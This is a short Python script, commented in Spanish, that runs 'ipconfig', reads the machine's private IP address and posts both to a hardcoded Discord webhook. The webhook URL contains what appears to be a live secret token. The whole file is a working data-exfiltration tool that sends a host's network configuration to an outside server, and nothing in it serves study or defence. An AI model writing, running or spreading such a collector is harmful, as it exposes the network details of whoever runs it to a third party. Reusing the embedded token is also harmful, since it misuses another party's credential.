#!/usr/bin/env python3

import requests
import json
import os
import socket

# URL del webhook de Discord (reemplaza con tu URL de webhook)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1269114269233057882/3TvRs0z2pxX1qBoIR689BJaSgX5zPArGihZboObMZZB6RdyEz_t924zl1qksyClBcur_'

def get_network_info():
    return os.popen('ipconfig').read()

def get_private_ip():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def send_data_to_discord_webhook(data):
    try:
        # Construye el mensaje a enviar al webhook
        message = {
            'content': f'Información de red:\n{data["network_info"]}\n\nIP Privada: {data["private_ip"]}',
            'username': 'Mi Bot'
        }
        
        # Envía la solicitud POST al webhook
        response = requests.post(
            WEBHOOK_URL,
            data=json.dumps(message),
            headers={'Content-Type': 'application/json'}
        )
        
        # Verifica la respuesta del servidor
        if response.status_code == 204:
            print('Datos enviados correctamente al webhook.')
        else:
            print(f'Error al enviar datos: {response.status_code}, Respuesta: {response.text}')
    
    except Exception as e:
        print(f'Error: {e}')

if __name__ == "__main__":
    network_info = get_network_info()
    private_ip = get_private_ip()
    
    data = {
        'network_info': network_info,
        'private_ip': private_ip
    }
    
    # Envía los datos al webhook de Discord
    send_data_to_discord_webhook(data)
